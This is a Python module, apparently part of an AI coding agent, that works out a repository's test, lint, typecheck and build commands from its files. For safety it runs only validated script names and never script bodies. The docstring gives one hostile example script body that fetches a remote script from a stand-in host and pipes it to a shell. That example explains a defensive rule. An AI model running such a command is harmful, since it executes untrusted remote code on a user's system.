"""What this repository can verify itself with, read from the repository.

The half of the verification engine that answers "what COULD be run here".
`agent_verify_engine` decides what SHOULD be, and `agent_verify` holds what
came back. Nothing in this module executes anything -- it reads files and
returns descriptions -- which is what makes it testable against a directory of
marker files with no tooling installed at all.

The rule the whole module is built around, and section 5 of the brief in one
sentence: **ask the repository how it verifies itself before guessing.** A
project with `"test": "vitest run"` in its package.json is tested by running
that script through its package manager, not by TMT deciding that `jest` is
the usual thing. Guessing is the LAST tier, not the first, and every candidate
carries the evidence that produced it so a report can say why it was chosen.

The safety rule, and it is not negotiable (section 31):

  **A command is never a string taken from a repository file.**

What is taken from a repository file is a NAME -- a package.json script, a
Makefile target -- and a name is validated against `_SAFE_NAME` before it is
put into an argv list built from a fixed table of runner shapes. So a
package.json script whose body is `vitest && curl evil.sh | sh` is run as
`npm run test`: by npm, with npm's semantics, exactly as the project's own
developers run it, and TMT never parses or executes that string. There is no
`shell=True` anywhere on this path and no code here that concatenates a
command. `agent_execution.run_command` takes the argv list and nothing else.
"""

import json
import re
from pathlib import Path

import agent_config
from agent_verify import (
    BUILD, FORMAT, LEVEL_BASIC, LEVEL_BUILD, LEVEL_FULL, LEVEL_STATIC, LINT,
    SYNTAX, TEST, TYPECHECK,
)

# How good a reason there is for running one command, section 23 as five
# numbers. Lower wins. The order is the brief's: what the repository itself
# declares beats what its configuration implies, which beats what its package
# manager offers, which beats what the language usually does, which beats a
# guess.
PRIORITY_REPO = 1        # a command this repository defines by name
PRIORITY_CONFIG = 2      # tooling this repository has configured
PRIORITY_MANAGER = 3     # the project's package manager's own verb
PRIORITY_ECOSYSTEM = 4   # the standard command for this language
PRIORITY_FALLBACK = 5    # a guess, and labelled as one

PRIORITY_WORDS = {
    PRIORITY_REPO: "this repository defines it",
    PRIORITY_CONFIG: "this repository configures the tool",
    PRIORITY_MANAGER: "the project's package manager provides it",
    PRIORITY_ECOSYSTEM: "it is the standard command for this ecosystem",
    PRIORITY_FALLBACK: "a guess from the files present",
}

# A name lifted out of a project file, before it is put in an argv list. Not a
# security boundary on its own -- there is no shell, so there is nothing to
# escape -- but a name that does not look like a name is a sign the file was
# not what this code thought it was, and running it would be acting on a
# misreading. Bounded in length for the same reason.
_SAFE_NAME = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_.:@/+-]{0,63}$")

# How much of a project file is read. A Makefile or a package.json is a
# configuration file; anything past this is not one, and reading a hundred
# megabytes to find a target name would be a way to hang a session.
MAX_CONFIG_CHARS = 400000

# Every marker the brief lists, and what each one is evidence of. A file being
# present is the only thing this table asserts -- what it MEANS is decided
# below, where the evidence is combined.
MARKERS = {
    "pyproject.toml": "python", "setup.py": "python", "setup.cfg": "python",
    "requirements.txt": "python", "Pipfile": "python", "poetry.lock": "python",
    "uv.lock": "python", "tox.ini": "python", "pytest.ini": "python",
    "package.json": "node", "package-lock.json": "node",
    "yarn.lock": "node", "pnpm-lock.yaml": "node", "bun.lock": "node",
    "bun.lockb": "node",
    "tsconfig.json": "typescript",
    "Cargo.toml": "rust",
    "go.mod": "go",
    "Makefile": "make", "makefile": "make", "GNUmakefile": "make",
    "CMakeLists.txt": "cmake",
    "pom.xml": "java", "build.gradle": "java", "build.gradle.kts": "java",
    "gradlew": "java", "gradlew.bat": "java",
    "composer.json": "php",
    "Gemfile": "ruby", "Rakefile": "ruby",
    "mix.exs": "elixir",
}

# The project's own test entry point, where it has one that is a script rather
# than a tool. This is the top tier for a repository like TMT itself, which
# tests with `python run_tests.py` and has no pytest configuration at all --
# guessing `pytest` there would run a different thing from what the project
# runs, and reporting that as the project's verification would be wrong even
# when it passed.
SCRIPT_RUNNERS = ("run_tests.py", "runtests.py", "run_all_tests.py")

# Which node package manager, decided by the lockfile that is actually there.
# In lockfile order rather than alphabetical: a repository with two lockfiles
# has one it really uses, and the more specific tools are checked first.
_NODE_MANAGERS = (("bun.lockb", "bun"), ("bun.lock", "bun"),
                  ("pnpm-lock.yaml", "pnpm"), ("yarn.lock", "yarn"),
                  ("package-lock.json", "npm"))

# Which python environment manager, same rule. The prefix is what a command
# is run THROUGH, so a project managed by uv or poetry gets its own
# environment's tools rather than whatever happens to be on PATH.
_PYTHON_PREFIXES = (("uv.lock", ("uv", "run")),
                    ("poetry.lock", ("poetry", "run")),
                    ("Pipfile.lock", ("pipenv", "run")),
                    ("Pipfile", ("pipenv", "run")))

# Script and target names, and what kind of check each one is. Exact names
# first because they are unambiguous; the token pass below catches
# "lint:fix"-shaped names that the exact list cannot enumerate.
_EXACT_CATEGORIES = {
    "test": TEST, "tests": TEST, "unit": TEST, "spec": TEST, "check": TEST,
    "lint": LINT, "eslint": LINT, "ruff": LINT, "flake8": LINT, "pylint": LINT,
    "typecheck": TYPECHECK, "type-check": TYPECHECK, "types": TYPECHECK,
    "tsc": TYPECHECK, "mypy": TYPECHECK, "pyright": TYPECHECK,
    "build": BUILD, "compile": BUILD, "dist": BUILD, "bundle": BUILD,
    "format": FORMAT, "fmt": FORMAT, "prettier": FORMAT, "black": FORMAT,
}

# Substrings, in the order they are tried. Order matters: "typecheck" contains
# "check", and reading it as a test run would run the wrong thing and report
# the wrong category. The most specific token wins because it is tried first.
_TOKEN_CATEGORIES = (
    ("typecheck", TYPECHECK), ("type-check", TYPECHECK), ("tsc", TYPECHECK),
    ("mypy", TYPECHECK), ("pyright", TYPECHECK), ("types", TYPECHECK),
    ("lint", LINT), ("eslint", LINT), ("ruff", LINT),
    ("format", FORMAT), ("prettier", FORMAT),
    ("build", BUILD), ("compile", BUILD),
    ("test", TEST), ("spec", TEST),
)

# Where a category sits in the hierarchy of section 8 when it is a whole-repo
# command. A targeted test run is level 3 and is built by the engine from the
# runner below, not from this table.
LEVEL_FOR_CATEGORY = {
    SYNTAX: LEVEL_BASIC, FORMAT: LEVEL_BASIC,
    LINT: LEVEL_STATIC, TYPECHECK: LEVEL_STATIC,
    BUILD: LEVEL_BUILD, TEST: LEVEL_FULL,
}

# A name that names a check but is one this must not run. `format` without
# `:check` REWRITES the files -- it is not a verification, it is an edit, and
# running it would change the code under the review that is about to read it.
_WRITES_RATHER_THAN_CHECKS = ("format", "fmt", "prettier", "black", "fix",
                              "write", "prettify", "reformat")


def _looks_like_a_check(name):
    """Whether a repository-defined name is safe to run as a VERIFICATION.

    A `format` script rewrites files. So does `lint:fix`. Running either would
    edit the code in the middle of verifying it, and the verification would
    then be of something the model never wrote -- and it would invalidate the
    review that was about to read the diff. Only the checking forms are taken:
    `format:check`, `fmt:check`, `lint` without a fixer in its name.
    """
    lowered = str(name).lower()
    if "check" in lowered or lowered.endswith(":ci") or lowered.endswith("-ci"):
        return True
    return not any(token in lowered for token in _WRITES_RATHER_THAN_CHECKS)


def category_for(name):
    """The kind of check a script or target name describes, or "".

    Exact names first, then the token pass. A name nothing recognises comes
    back empty and is not run: a repository is full of scripts that do things
    -- `deploy`, `start`, `clean` -- and running one because its name was
    unfamiliar is the opposite of what this module is for.
    """
    lowered = str(name or "").strip().lower()
    if lowered in _EXACT_CATEGORIES:
        return _EXACT_CATEGORIES[lowered]
    for token, category in _TOKEN_CATEGORIES:
        if token in lowered:
            return category
    return ""


class CheckSpec:
    """One command that COULD be run, and the evidence for running it.

    Not a check and not a result: `agent_verify.VerificationCheck` is what
    gets a status, and it only gets one from a process. This is the candidate,
    carrying everything the selector needs to rank it and everything a report
    needs to explain it.
    """

    __slots__ = ("id", "name", "category", "level", "argv", "priority", "why",
                 "scope")

    def __init__(self, identifier, name, category, level, argv,
                 priority=PRIORITY_FALLBACK, why="", scope=()):
        self.id = str(identifier)
        self.name = str(name)
        self.category = str(category)
        self.level = int(level)
        self.argv = tuple(str(part) for part in argv)
        self.priority = int(priority)
        self.why = why or PRIORITY_WORDS.get(self.priority, "")
        self.scope = tuple(scope or ())

    @property
    def command_line(self):
        return " ".join(self.argv)

    def as_dict(self):
        return {"id": self.id, "name": self.name, "category": self.category,
                "level": self.level, "command": list(self.argv),
                "priority": self.priority, "why": self.why}

    def __repr__(self):
        return "CheckSpec(%s, %s, L%d, %s)" % (
            self.id, self.category, self.level, self.command_line)


class TestRunner:
    """How this project runs its tests, and whether it can run a subset.

    `supports_paths` is the whole reason this is separate from a CheckSpec.
    Change-aware verification wants to run the tests for what changed, and
    that is only possible when the project's test command takes paths --
    `pytest` does, `go test` does, `npm test` in general does not, and a
    project whose entry point is `python run_tests.py` runs everything or
    nothing. Where a subset cannot be asked for, the targeted levels are
    skipped WITH THAT REASON rather than faked by running the whole suite and
    calling it targeted.
    """

    __slots__ = ("name", "argv", "priority", "why", "supports_paths", "flag")

    def __init__(self, name, argv, priority=PRIORITY_ECOSYSTEM, why="",
                 supports_paths=False, flag=()):
        self.name = str(name)
        self.argv = tuple(str(part) for part in argv)
        self.priority = int(priority)
        self.why = why or PRIORITY_WORDS.get(self.priority, "")
        self.supports_paths = bool(supports_paths)
        # What goes between the command and the paths, where anything does.
        # `go test` takes packages directly; `cargo test` needs a filter word.
        self.flag = tuple(str(part) for part in (flag or ()))

    def argv_for(self, paths):
        """The command to run just these paths, or None when it cannot.

        None rather than the whole suite. A runner that cannot narrow has to
        say so, because the caller's next decision -- whether the targeted
        level ran at all -- depends on knowing the difference.
        """
        chosen = [str(p) for p in (paths or ()) if str(p).strip()]
        if not self.supports_paths or not chosen:
            return None
        return tuple(self.argv) + tuple(self.flag) + tuple(chosen)

    def __repr__(self):
        return "TestRunner(%s, paths=%s)" % (self.name, self.supports_paths)


class Discovery:
    """Everything read off this repository, and nothing inferred beyond it."""

    def __init__(self, root, markers=None, ecosystems=(), specs=(),
                 runner=None, notes=(), environment=""):
        self.root = root
        self.markers = dict(markers or {})
        self.ecosystems = tuple(ecosystems)
        self.specs = tuple(specs)
        self.runner = runner
        self.notes = tuple(notes)
        self.environment = environment

    def by_level(self, level):
        return tuple(spec for spec in self.specs if spec.level == level)

    def by_category(self, category):
        return tuple(spec for spec in self.specs if spec.category == category)

    def describe(self):
        """What was found, for `/verify` and for a report on a failed run."""
        rows = ["Repository: %s" % self.root]
        rows.append("Detected: %s" % (", ".join(self.ecosystems) or "nothing recognised"))
        if self.environment:
            rows.append("Environment: %s" % self.environment)
        found = sorted(name for name in self.markers)
        rows.append("Markers: %s" % (", ".join(found[:20]) or "none"))
        if self.runner is not None:
            rows.append("Test command: %s (%s)%s"
                        % (" ".join(self.runner.argv), self.runner.why,
                           "" if self.runner.supports_paths
                           else "; it cannot be narrowed to specific paths"))
        else:
            rows.append("Test command: none found.")
        rows.append("")
        rows.append("Checks available:")
        if not self.specs:
            rows.append("  none")
        for spec in self.specs:
            rows.append("  L%d %-10s %-22s %s"
                        % (spec.level, spec.category, spec.name, spec.command_line))
        for note in self.notes:
            rows.append(note)
        return "\n".join(rows)

    def __repr__(self):
        return "Discovery(%s, %d spec(s))" % (
            ",".join(self.ecosystems) or "unknown", len(self.specs))


# --- reading the repository -------------------------------------------------


def _read(path):
    """One configuration file's text, bounded, or "" if it cannot be read.

    Never raises. A repository is allowed to contain an unreadable file, a
    binary one under a text name, or one being written while this runs, and
    none of those is a reason for verification to fall over.
    """
    try:
        with open(str(path), "r", encoding="utf-8", errors="replace") as handle:
            return handle.read(MAX_CONFIG_CHARS)
    except OSError:
        return ""


def read_markers(root):
    """{filename: True} for every marker in MARKERS that is actually there.

    The top level only. A `package.json` three directories down belongs to
    something vendored or nested, and treating it as this project's would run
    a dependency's test suite in the name of verifying the change.
    """
    root = Path(root)
    found = {}
    for name in MARKERS:
        try:
            if (root / name).exists():
                found[name] = True
        except OSError:
            continue
    for name in SCRIPT_RUNNERS:
        try:
            if (root / name).is_file():
                found[name] = True
        except OSError:
            continue
    return found


def package_scripts(root):
    """{name: body} from package.json "scripts", or {} for none.

    The bodies are read so a report can SAY what a script does. They are never
    executed and never parsed for a command: the argv built from this is
    `<manager> run <name>`, and the name is what has to be safe.
    """
    text = _read(Path(root) / "package.json")
    if not text.strip():
        return {}
    try:
        data = json.loads(text)
    except ValueError:
        return {}
    scripts = data.get("scripts") if isinstance(data, dict) else None
    if not isinstance(scripts, dict):
        return {}
    return dict((str(name), str(body)) for name, body in scripts.items()
                if _SAFE_NAME.match(str(name)))


_MAKE_TARGET = re.compile(r"^([A-Za-z0-9][A-Za-z0-9_.\-]*)\s*:(?!=)")


def makefile_targets(root):
    """Every target name a Makefile declares, in file order.

    A deliberately shallow read: a line that starts at column zero with a name
    and a colon. Make's real grammar has variables, conditionals and includes
    in it, and following those would be writing a make implementation to
    decide which of three commands to run.
    """
    root = Path(root)
    for name in ("Makefile", "makefile", "GNUmakefile"):
        text = _read(root / name)
        if not text.strip():
            continue
        targets = []
        for line in text.splitlines():
            match = _MAKE_TARGET.match(line)
            if not match:
                continue
            target = match.group(1)
            if target.startswith(".") or target in targets:
                continue
            targets.append(target)
        return targets
    return []


_TOOL_SECTION = re.compile(r"^\s*\[tool\.([A-Za-z0-9_-]+)", re.MULTILINE)


def pyproject_tools(root):
    """The tool names a pyproject.toml configures, lowercased.

    Parsed by hand rather than with a TOML library, because TMT depends on the
    standard library alone and `tomllib` only exists from 3.11. All that is
    wanted is which `[tool.X]` sections exist, and a section header is a line
    this can read without implementing TOML.
    """
    text = _read(Path(root) / "pyproject.toml")
    if not text.strip():
        return set()
    return set(match.group(1).lower() for match in _TOOL_SECTION.finditer(text))


# Tool names looked for in CI configuration. Used ONLY to raise the priority
# of a command that was already discovered another way -- what CI runs is
# strong evidence that a tool is the project's real one. A command is never
# built from CI text: that text is arbitrary shell, and turning it into an
# argv list would be exactly the thing this module refuses to do.
_CI_TOOLS = ("pytest", "ruff", "mypy", "pyright", "flake8", "black", "tox",
             "eslint", "tsc", "vitest", "jest", "cargo", "gofmt", "golangci",
             "npm", "pnpm", "yarn", "bun", "make", "gradle", "mvn")

_CI_PLACES = (".github/workflows", ".gitlab-ci.yml", ".circleci/config.yml",
              "azure-pipelines.yml", ".travis.yml", "Jenkinsfile")


def ci_mentions(root):
    """Tool names that this repository's CI configuration mentions.

    Evidence, never a command. See `_CI_TOOLS`.
    """
    root = Path(root)
    text = []
    for place in _CI_PLACES:
        target = root / place
        try:
            if target.is_dir():
                for child in sorted(target.iterdir())[:20]:
                    if child.suffix.lower() in (".yml", ".yaml"):
                        text.append(_read(child))
            elif target.is_file():
                text.append(_read(target))
        except OSError:
            continue
    joined = "\n".join(text).lower()
    if not joined:
        return set()
    return set(tool for tool in _CI_TOOLS
               if re.search(r"\b" + re.escape(tool) + r"\b", joined))


def node_manager(markers):
    """Which node package manager this project uses, from its lockfile."""
    for lockfile, manager in _NODE_MANAGERS:
        if lockfile in markers:
            return manager
    return "npm"


def python_prefix(markers):
    """What python tooling is run THROUGH here, as an argv prefix."""
    for lockfile, prefix in _PYTHON_PREFIXES:
        if lockfile in markers:
            return tuple(prefix)
    return ()


# --- turning what was read into candidates ---------------------------------


def _script_specs(root, markers, ci):
    """Candidates from package.json scripts. The repository's own words."""
    scripts = package_scripts(root)
    if not scripts:
        return []
    manager = node_manager(markers)
    boost = PRIORITY_REPO
    specs = []
    for name in sorted(scripts):
        category = category_for(name)
        if not category or not _looks_like_a_check(name):
            continue
        why = ("package.json defines a \"%s\" script (%s)"
               % (name, _short(scripts[name])))
        if manager in ci:
            why += "; CI runs %s" % manager
        specs.append(CheckSpec(
            "npm:%s" % name, "%s run %s" % (manager, name), category,
            LEVEL_FOR_CATEGORY.get(category, LEVEL_STATIC),
            (manager, "run", name), priority=boost, why=why))
    return specs


def _make_specs(root, markers, ci):
    """Candidates from Makefile targets. Also the repository's own words."""
    del markers
    targets = makefile_targets(root)
    if not targets:
        return []
    specs = []
    for target in targets:
        category = category_for(target)
        if not category or not _looks_like_a_check(target):
            continue
        why = "the Makefile declares a \"%s\" target" % target
        if "make" in ci:
            why += "; CI runs make"
        specs.append(CheckSpec(
            "make:%s" % target, "make %s" % target, category,
            LEVEL_FOR_CATEGORY.get(category, LEVEL_STATIC),
            ("make", target), priority=PRIORITY_REPO, why=why))
    return specs


def _python_candidates(root, markers, ci):
    """Every python check this repository could run."""
    prefix = python_prefix(markers)
    configured = pyproject_tools(root)
    specs = []

    def add(identifier, name, category, level, argv, priority, why):
        specs.append(CheckSpec(identifier, name, category, level,
                               tuple(prefix) + tuple(argv), priority, why))

    if "ruff" in configured or "ruff" in ci:
        add("py:ruff", "ruff", LINT, LEVEL_STATIC, ("ruff", "check", "."),
            PRIORITY_CONFIG if "ruff" in configured else PRIORITY_ECOSYSTEM,
            "pyproject.toml configures [tool.ruff]" if "ruff" in configured
            else "CI runs ruff")
    if "mypy" in configured or "mypy" in ci:
        add("py:mypy", "mypy", TYPECHECK, LEVEL_STATIC, ("mypy", "."),
            PRIORITY_CONFIG if "mypy" in configured else PRIORITY_ECOSYSTEM,
            "pyproject.toml configures [tool.mypy]" if "mypy" in configured
            else "CI runs mypy")
    if "pyright" in configured or "pyright" in ci:
        add("py:pyright", "pyright", TYPECHECK, LEVEL_STATIC, ("pyright",),
            PRIORITY_CONFIG if "pyright" in configured else PRIORITY_ECOSYSTEM,
            "pyright is configured or run in CI")
    if "black" in configured:
        add("py:black", "black --check", FORMAT, LEVEL_BASIC,
            ("black", "--check", "."), PRIORITY_CONFIG,
            "pyproject.toml configures [tool.black]")
    return specs


def _python_runner(root, markers, ci):
    """How this python project runs its tests.

    The order is the point. A `run_tests.py` in the root is the project saying
    in a file what its test command is, and it outranks pytest even where
    pytest would work -- TMT's own repository is exactly that case, and
    running `pytest` there would run a different thing from what the project
    runs and report it as the project's verification.
    """
    prefix = python_prefix(markers)
    for script in SCRIPT_RUNNERS:
        if script in markers:
            return TestRunner(
                script, tuple(prefix) + ("python", script),
                priority=PRIORITY_REPO,
                why="this repository has %s in its root, which is how it runs "
                    "its own suite" % script,
                # A script runner takes whatever arguments its author gave it,
                # and TMT does not know what those are. Assuming it accepts
                # paths would produce a command that either errors or, worse,
                # silently runs everything while being reported as targeted.
                supports_paths=False)
    configured = pyproject_tools(root)
    if "pytest" in configured or "pytest" in ci or (Path(root) / "pytest.ini").exists():
        return TestRunner(
            "pytest", tuple(prefix) + ("pytest", "-q"),
            priority=PRIORITY_CONFIG,
            why="pytest is configured for this project",
            supports_paths=True)
    return TestRunner(
        "pytest", tuple(prefix) + ("pytest", "-q"),
        priority=PRIORITY_ECOSYSTEM,
        why="pytest is the standard python test runner; nothing in this "
            "repository names a different one",
        supports_paths=True)


def _node_runner(markers, scripts, ci):
    """How this node project runs its tests, where it says so."""
    manager = node_manager(markers)
    for name in ("test", "tests", "test:unit"):
        if name in scripts:
            return TestRunner(
                "%s run %s" % (manager, name), (manager, "run", name),
                priority=PRIORITY_REPO,
                why="package.json defines a \"%s\" script" % name,
                # A package script is an arbitrary command line. Some accept
                # paths and some do not, and getting it wrong runs the whole
                # suite under the name of a targeted one.
                supports_paths=False)
    if "package.json" in markers:
        return TestRunner(
            "%s test" % manager, (manager, "test"),
            priority=PRIORITY_MANAGER,
            why="%s is this project's package manager" % manager,
            supports_paths=False)
    del ci
    return None


def _rust_candidates(ci):
    del ci
    return [
        CheckSpec("rs:fmt", "cargo fmt --check", FORMAT, LEVEL_BASIC,
                  ("cargo", "fmt", "--check"), PRIORITY_ECOSYSTEM,
                  "Cargo.toml is present"),
        CheckSpec("rs:check", "cargo check", TYPECHECK, LEVEL_STATIC,
                  ("cargo", "check"), PRIORITY_ECOSYSTEM,
                  "Cargo.toml is present"),
        CheckSpec("rs:clippy", "cargo clippy", LINT, LEVEL_STATIC,
                  ("cargo", "clippy"), PRIORITY_ECOSYSTEM,
                  "Cargo.toml is present"),
        CheckSpec("rs:build", "cargo build", BUILD, LEVEL_BUILD,
                  ("cargo", "build"), PRIORITY_ECOSYSTEM,
                  "Cargo.toml is present"),
    ]


def _go_candidates(ci):
    del ci
    return [
        CheckSpec("go:fmt", "gofmt -l", FORMAT, LEVEL_BASIC,
                  ("gofmt", "-l", "."), PRIORITY_ECOSYSTEM, "go.mod is present"),
        CheckSpec("go:vet", "go vet", LINT, LEVEL_STATIC,
                  ("go", "vet", "./..."), PRIORITY_ECOSYSTEM, "go.mod is present"),
        CheckSpec("go:build", "go build", BUILD, LEVEL_BUILD,
                  ("go", "build", "./..."), PRIORITY_ECOSYSTEM, "go.mod is present"),
    ]


def _typescript_candidates(root, ci):
    del ci
    if not (Path(root) / "tsconfig.json").exists():
        return []
    return [CheckSpec("ts:tsc", "tsc --noEmit", TYPECHECK, LEVEL_STATIC,
                      ("npx", "--no-install", "tsc", "--noEmit"),
                      PRIORITY_CONFIG,
                      "tsconfig.json is present, so this project type-checks "
                      "with tsc")]


def _java_candidates(markers, ci):
    del ci
    specs = []
    if "pom.xml" in markers:
        specs.append(CheckSpec("java:mvn", "mvn test", TEST, LEVEL_FULL,
                               ("mvn", "-B", "-q", "test"), PRIORITY_ECOSYSTEM,
                               "pom.xml is present"))
    elif "build.gradle" in markers or "build.gradle.kts" in markers:
        specs.append(CheckSpec("java:gradle", "gradle test", TEST, LEVEL_FULL,
                               ("gradle", "test"), PRIORITY_ECOSYSTEM,
                               "a gradle build file is present"))
    return specs


def _best(specs):
    """One candidate per (category, level): the one with the best evidence.

    Section 23's "do not run redundant commands without a reason". Two
    commands that check the same thing at the same level are two ways of
    asking one question, and running both spends a minute to learn nothing --
    so the tier that came from the repository's own words wins, and the guess
    is dropped.
    """
    chosen = {}
    for spec in specs:
        key = (spec.category, spec.level)
        current = chosen.get(key)
        if current is None or spec.priority < current.priority:
            chosen[key] = spec
    return sorted(chosen.values(), key=lambda s: (s.level, s.priority, s.id))


def _short(text, limit=60):
    flat = " ".join(str(text or "").split())
    return flat if len(flat) <= limit else flat[:limit - 1] + "…"


def _environment_words(markers, ecosystems):
    """What the project's tooling actually is, for the report.

    Section 29: say what was detected. Naming it is most of the value -- a
    verification run under the wrong python is a verification of something
    else, and a reader who can see "poetry" can tell at a glance.
    """
    words = []
    if "node" in ecosystems:
        words.append(node_manager(markers))
    if "python" in ecosystems:
        prefix = python_prefix(markers)
        words.append(" ".join(prefix) if prefix else "system python")
    for tag, name in (("rust", "cargo"), ("go", "go"), ("java", "java"),
                      ("php", "composer"), ("ruby", "bundler"),
                      ("elixir", "mix")):
        if tag in ecosystems:
            words.append(name)
    return ", ".join(words)


def detect(root=None):
    """Everything this repository offers, as a Discovery.

    Reads only. Nothing here runs a command, and nothing here checks whether a
    tool is installed -- that is `agent_execution.command_available`, asked by
    the engine at the moment it would run something, so a report can say "not
    installed" about the command it actually meant to run.
    """
    root = Path(root or agent_config.ROOT_DIR)
    markers = read_markers(root)
    ci = ci_mentions(root)
    ecosystems = []
    for name in markers:
        tag = MARKERS.get(name)
        if tag and tag not in ecosystems:
            ecosystems.append(tag)
    # A directory of .py files with no manifest at all is still a python
    # project, and refusing to verify it because it has no pyproject.toml
    # would be refusing the commonest shape of small repository there is.
    if "python" not in ecosystems and _has_python_source(root):
        ecosystems.append("python")
    ecosystems = tuple(ecosystems)

    specs = []
    notes = []
    scripts = package_scripts(root)
    if "node" in ecosystems or "typescript" in ecosystems:
        specs.extend(_script_specs(root, markers, ci))
        specs.extend(_typescript_candidates(root, ci))
    if "make" in ecosystems:
        specs.extend(_make_specs(root, markers, ci))
    if "python" in ecosystems:
        specs.extend(_python_candidates(root, markers, ci))
    if "rust" in ecosystems:
        specs.extend(_rust_candidates(ci))
    if "go" in ecosystems:
        specs.extend(_go_candidates(ci))
    if "java" in ecosystems:
        specs.extend(_java_candidates(markers, ci))

    runner = None
    if "python" in ecosystems:
        runner = _python_runner(root, markers, ci)
    if runner is None or (("node" in ecosystems) and "python" not in ecosystems):
        node = _node_runner(markers, scripts, ci)
        if node is not None:
            runner = node
    if runner is None and "rust" in ecosystems:
        runner = TestRunner("cargo test", ("cargo", "test"),
                            priority=PRIORITY_ECOSYSTEM,
                            why="Cargo.toml is present", supports_paths=True)
    if runner is None and "go" in ecosystems:
        runner = TestRunner("go test", ("go", "test"),
                            priority=PRIORITY_ECOSYSTEM,
                            why="go.mod is present", supports_paths=True,
                            flag=())
    if runner is None and "elixir" in ecosystems:
        runner = TestRunner("mix test", ("mix", "test"),
                            priority=PRIORITY_ECOSYSTEM,
                            why="mix.exs is present", supports_paths=True)

    if not ecosystems:
        notes.append("Nothing in this repository names a build system, a "
                     "package manager or a test runner, so there is no "
                     "project-defined command to run.")
    if ci:
        notes.append("CI configuration mentions: %s. That was used as evidence "
                     "for which tools this project really uses; no command was "
                     "taken from it." % ", ".join(sorted(ci)))
    return Discovery(root=str(root), markers=markers, ecosystems=ecosystems,
                     specs=tuple(_best(specs)), runner=runner, notes=tuple(notes),
                     environment=_environment_words(markers, ecosystems))


def _has_python_source(root):
    """Whether the top of this repository holds python source at all."""
    try:
        for entry in Path(root).iterdir():
            if entry.suffix == ".py" and entry.is_file():
                return True
    except OSError:
        pass
    return False
